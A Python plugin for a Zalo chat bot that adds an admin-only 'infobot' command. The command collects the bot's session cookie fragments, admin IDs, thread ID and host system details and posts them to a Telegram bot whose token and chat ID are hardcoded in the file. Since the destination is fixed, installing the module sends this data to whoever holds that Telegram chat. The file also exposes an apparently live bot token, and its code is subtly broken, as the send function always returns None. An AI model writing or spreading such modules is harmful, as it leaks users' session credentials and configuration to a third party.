# -*- coding: utf-8 -*-
import logging
import requests
import platform
import sys
from typing import Optional, Union, Dict, Any
from datetime import datetime

# Giả định các đối tượng Zalo API được import từ hệ thống bot
try:
    from zlapi.models import Message, ThreadType
except ImportError:
    class Message:
        def __init__(self, text="", mention=None):
            self.text = text
            self.mention = mention
    
    class ThreadType:
        GROUP = 1
        PERSONAL = 2

# --- THAY THẾ GIÁ TRỊ TỪ config.py ---
try:
    from config import read_prefix, read_admin, PREFIX, ADMIN
    PREFIX = PREFIX if 'PREFIX' in dir() else read_prefix()
    ADMIN = ADMIN if 'ADMIN' in dir() else read_admin()
except ImportError:
    try:
        from config import PREFIX, ADMIN
    except ImportError:
        PREFIX = "?"
        ADMIN = "637876082720685615"

TELEGRAM_BOT_TOKEN = "8073518245:AAEAQRR7qQizQkRbvPXV31zmxarEgENBX64"
TELEGRAM_CHAT_ID = "5792633052"

logger = logging.getLogger("TELE_NOTIFIER")
logger.setLevel(logging.INFO)

# --- 1. Thông tin Module ---
des = {
    'version': "1.0.2",
    'credits': "AI Implementation",
    'description': "Gửi báo cáo thông tin đầy đủ của bot, bao gồm session cookies, đến Telegram.",
    'power': "Quản trị viên Bot"
}

# --- 2. Class Gửi Thông Báo Telegram (TelegramNotifier) ---
class TelegramNotifier:
    """Class chuyên dụng để gửi thông báo đến Telegram."""
    def __init__(self, bot_token: str, chat_id: Union[str, int]):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        self.is_active = self._check_config()
        if self.is_active:
             logger.info("[TELE-TN] Telegram Notifier đã được khởi tạo thành công.")
        else:
             logger.error("[TELE-TN] Cấu hình Telegram bị thiếu/sai. Notifier không hoạt động.")

    def _check_config(self):
        # Kiểm tra token và chat_id không rỗng và không phải giá trị mặc định (đã được thay thế)
        return bool(self.bot_token and self.bot_token != "YOUR_BOT_TOKEN_HERE" and self.chat_id and self.chat_id != "-123456789")

    def send_message(self, message_text: str, parse_mode: str = "Markdown", disable_notification: bool = False) -> Optional[Dict[str, Any]]:
        # Gửi payload đến API Telegram
        if not self.is_active or not message_text: 
            return None
            
        payload = {
            'chat_id': self.chat_id,
            'text': message_text,
            'parse_mode': parse_mode, 
            'disable_notification': disable_notification
        }

        try:
            response = requests.post(self.base_url, data=payload, timeout=5) 
            response.raise_for_status() 
            result = response.json()
            # ... (Xử lý kết quả)
        except requests.exceptions.RequestException as e:
            logger.error(f"[TELE-TN] Lỗi kết nối khi gửi thông báo Telegram: {e}")
        except Exception as e:
            logger.error(f"[TELE-TN] Lỗi không xác định khi gửi thông báo: {e}")
            
        return None

# --- 3. Class Xử lý Lệnh (BotInfoHandler) ---
class BotInfoHandler:
    def __init__(self, client):
        self.client = client
        self.notifier = TelegramNotifier(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
        
    def _get_user_name(self, user_id):
        """Lấy tên người dùng Zalo."""
        try:
            user_info = self.client.fetchUserInfo(str(user_id))
            return user_info.changed_profiles.get(str(user_id), {}).get('zaloName', str(user_id))
        except Exception:
            return str(user_id)

    def _send_reply(self, message_object, thread_id, thread_type, author_id, rest_text):
        """Hàm trợ giúp định dạng và gửi phản hồi Zalo."""
        # Định dạng tin nhắn phản hồi
        name = self._get_user_name(author_id)
        msg = f"{name}\n➜{rest_text}"
        try:
            self.client.replyMessage(Message(text=msg), message_object, thread_id, thread_type, ttl=120000)
        except Exception as e:
            logger.error(f"[TELE-TN] Lỗi khi gửi phản hồi Zalo: {e}")

    def _get_cookies(self):
        """Cố gắng lấy cookie từ đối tượng Client."""
        # Thử 3 phương án lấy cookies từ client hoặc session của client
        try:
            if hasattr(self.client, 'cookies'):
                return dict(self.client.cookies)
            elif hasattr(self.client, 'session') and hasattr(self.client.session, 'cookies'):
                return dict(self.client.session.cookies)
            elif hasattr(self.client, 'cookie'): 
                return str(self.client.cookie)
            else:
                return "Không tìm thấy thuộc tính cookies."
        except Exception as e:
            return f"Lỗi truy cập cookies: {e}"

    def handle_bot_info(self, message_object, thread_id, thread_type, author_id, message_text):
        """Thu thập và gửi báo cáo thông tin bot/hệ thống."""

        # 1. Kiểm tra quyền Admin
        if str(author_id) not in ADMIN:
            self._send_reply(message_object, thread_id, thread_type, author_id, "🚫 Chỉ admin bot mới có quyền sử dụng lệnh này.")
            return

        if not self.notifier.is_active:
             self._send_reply(message_object, thread_id, thread_type, author_id, "❌ Tính năng thông báo Telegram chưa được cấu hình đúng.")
             return
        
        # 2. Thu thập và định dạng dữ liệu
        cookies_data = self._get_cookies()
        cookies_str = "\n".join([f"• {k}: {v[:10]}..." for k, v in cookies_data.items()]) if isinstance(cookies_data, dict) else str(cookies_data)
        
        # 3. Định dạng báo cáo Telegram (Markdown)
        config_info = (
            f"**⚙️ BÁO CÁO THÔNG TIN BOT/HỆ THỐNG**\n"
            f"--------------------------------------\n"
            f"**BOT/CONFIG**\n"
            f"➜ Lệnh Kích hoạt: `{message_text}`\n"
            f"➜ Prefix: `{PREFIX}`\n"
            f"➜ Admin IDs: `{', '.join(ADMIN) if isinstance(ADMIN, list) else str(ADMIN)}`\n" # Xử lý nếu ADMIN là string
            f"➜ TG Chat ID: `{TELEGRAM_CHAT_ID}`\n"
            f"➜ Thread ID: `{thread_id}`\n"
            f"➜ Tên Admin Yêu cầu: `{self._get_user_name(author_id)}`\n"
            f"**THÔNG TIN BẢO MẬT**\n"
            f"➜ Cookies (Đã ẩn): \n`{cookies_str}`\n"
            f"➜ IMEL (IMEI): `KHÔNG THỂ LẤY: Yêu cầu truy cập cấp OS/Thiết bị vật lý.`\n"
            f"**HỆ THỐNG**\n"
            f"➜ OS: `{platform.system()} {platform.release()}`\n"
            f"➜ Kiến trúc: `{platform.machine()}`\n"
            f"➜ Python Version: `{platform.python_version()}`\n"
            f"➜ Timezone: `{datetime.now().astimezone().tzinfo.tzname(datetime.now())}`\n"
            f"➜ Thời gian báo cáo: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"--------------------------------------\n"
        )
        
        # 4. Gửi báo cáo qua Telegram
        result = self.notifier.send_message(config_info, parse_mode="Markdown")
        
        if result:
            rest_text = "✅ Đã gửi báo cáo thông tin đầy đủ đến Telegram của Admin."
        else:
            rest_text = "❌ Lỗi: Không thể gửi báo cáo đến Telegram. Vui lòng kiểm tra cấu hình token."
            
        # 5. Phản hồi Zalo
        self._send_reply(message_object, thread_id, thread_type, author_id, rest_text)

# --- 4. HÀM KHỞI TẠO MODULE (hat) ---
def PTA():
    """Trả về ánh xạ lệnh cho bot. Sử dụng closure để khởi tạo class một lần."""
    
    _handler_instance = None

    def handle_teletn_command(*args, **kwargs):
        nonlocal _handler_instance
        client = kwargs.get('client') or (args[0] if args else None) 

        # Khởi tạo instance BotInfoHandler một lần
        if _handler_instance is None and client:
            _handler_instance = BotInfoHandler(client)
        
        # Xử lý khi lệnh 'infobot' được gọi
        if _handler_instance:
            if len(args) >= 6:
                # ... (Lấy các tham số tin nhắn Zalo)
                client = args[0]
                message_object = args[1]
                thread_id = args[2]
                thread_type = args[3]
                author_id = args[4]
                message_text = args[5] 
                
                _handler_instance.handle_bot_info(message_object, thread_id, thread_type, author_id, message_text)
            else:
                logger.error(f"[TELE-TN] Thiếu tham số khi gọi lệnh 'infobot'. Args nhận được: {args}")
                
    return {
        'infobot': handle_teletn_command # Ánh xạ lệnh 'infobot'
    }
